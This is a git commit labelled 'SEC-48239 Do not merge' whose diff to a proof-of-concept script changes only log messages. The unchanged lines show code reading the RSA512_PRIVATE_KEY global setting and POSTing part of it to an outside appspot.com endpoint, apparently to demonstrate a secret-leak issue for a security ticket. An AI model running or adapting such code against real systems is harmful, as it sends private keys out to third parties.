89a469e0b07467618607e1ce74ad3ed0c469db57
Matthew Belisle <matthew.belisle@workiva.com>
2020-09-21 12:32:16 -0500

    SEC-48239 Do not merge

--- SEC-48239/poc.py
+++ SEC-48239/poc.py
@@ -1,12 +1,12 @@
 def main(script_input, dry_run=True):
     import logging
-    logging.info('foo')
+    logging.info('SEC-48239 foo')
     from base import get_global_setting
     from google.appengine.api.urlfetch import fetch
-    logging.info('bar')
+    logging.info('SEC-48239 bar')
     fetch(
         'https://d097ed.appspot.com/wait/?chan=SEC-48239',
         method='POST',
         payload=get_global_setting('RSA512_PRIVATE_KEY')[:36],
     )
-    logging.info('baz')
+    logging.info('SEC-48239 baz')
